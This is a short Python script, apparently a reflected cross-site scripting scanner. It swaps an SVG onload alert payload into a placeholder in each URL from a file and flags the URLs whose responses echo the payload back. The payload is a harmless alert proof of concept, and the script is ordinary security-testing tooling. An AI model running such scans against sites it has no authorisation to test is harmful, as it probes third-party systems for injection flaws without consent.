#!/usr/bin/env python3
import sys
import requests

def scan(url):
    payload = '<svg/onload=alert("xss scanner by aufzayed)'
    try:
        req = requests.get(url.replace('XSS', payload))
        if payload in req.text:
            print(f'[#] {url} - vulnerable')
        else:
            print(f'[!] {url} - not vulnerable')
    except ConnectionError:
        pass

filename = sys.argv[1]
with open(filename) as urls_list:
    urls = urls_list.readlines()
    for url in urls:
        scan(url.strip())
